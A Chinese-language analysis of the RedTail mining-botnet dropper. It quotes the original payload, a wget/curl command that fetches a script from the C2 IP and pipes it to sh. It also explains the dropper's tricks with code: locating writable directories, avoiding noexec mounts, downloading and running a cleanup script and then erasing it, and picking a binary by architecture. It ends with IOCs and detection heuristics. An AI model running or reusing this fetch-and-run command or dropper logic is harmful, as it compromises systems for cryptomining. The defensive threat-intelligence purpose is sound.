# RedTail 挖矿僵尸网络 Dropper 分析

## 来源
C2: 217.60.195.113 (SWISSNET, 荷兰)
原始载荷: `(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s apache.selfrep`

## Dropper 脚本关键技巧

### 1. 自动找可写目录（`find` 精准版）
```bash
find / -type d -user $(whoami) -perm -u=rwx
```
比硬编码 `/tmp /var/tmp /dev/shm` 更可靠的理由：
- 全盘搜索，不依赖经验猜测
- `-user $(whoami)` 确保只找当前用户有权限的，不会因为找 root 目录而失败
- `-perm -u=rwx` 精确要求可写可执行

### 2. noexec 排除（防止写了跑不了）
```bash
NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
for dir in $NOEXEC_DIRS; do
  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
done
```
- 用 `/proc/mounts` 而非 `mount` 命令，更底层不受 shell 限制
- 动态排除 noexec 挂载点，不硬编码

### 3. 空间验证（避免写一半空间不够）
```bash
cd "$i" && touch .testfile && \
  (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || \
   truncate -s 2M .testfile2 >/dev/null 2>&1)
```
- `touch` 确认写权限
- `dd bs=2M count=1` 确认至少有 2MB 可用空间
- `|| truncate` 兜底（某些系统 dd 受限）

### 4. 清理竞争对手
```bash
dlr clean          # 从服务器下载 clean 脚本
chmod +x clean
sh clean           # 执行清理
rm -rf clean       # 清理痕迹
```
- `clean` 脚本用于清理旧的矿机进程和文件
- 执行完立刻删除，不留痕迹

### 5. 跨架构支持
```bash
ARCH=$(uname -mp)
if x86_64/amd64 → x86_64
elif i[3456]86  → i686
elif armv8/aarch64 → aarch64
elif armv7 → arm7
else → 逐个试所有架构
```

## IOC 清单

- **C2 IP**: 217.60.195.113
- **端口**: 443（HTTPS），22（SSH），65533（代理隧道）
- **ISP**: SWISSNET（瑞士，荷兰节点）
- **SSL 证书**: 自签名 `Internet Widgits Pty Ltd`
- **DNS PTR**: 无
- **crt.sh 域名**: 0 个
- **恶意路径**: `/sh`（dropper 脚本），`/x86_64`、`/i686`、`/aarch64`、`/arm7`（二进制）、`/clean`（清理脚本）
- **执行参数**: `apache.selfrep`（Apache 自我复制模式）
- **家族**: RedTail 挖矿僵尸网络
- **特征文件名**: `.redtail`（旧感染标记）

## 识别模式

类似 217.60.195.113 的恶意服务器识别清单：

1. **ISP = SWISSNET** — 高概率 bulletproof hosting
2. **自签名 SSL 证书** — `Internet Widgits Pty Ltd` 是 OpenSSL 默认值
3. **无 DNS PTR / 无 crt.sh 记录** — 临时服务器，不绑定域名
4. **默认 nginx 欢迎页** — 钓鱼/C2 尚未部署，或正伪装成普通服务器
5. **高端口 65533** — 管理隧道入口
6. **ip77.net 风险评分 ≥ 80** — 中高风险
7. **非标 TLS 端口 + 荷兰 ISP + 中文攻击者场景** — 跨地域攻击者常见
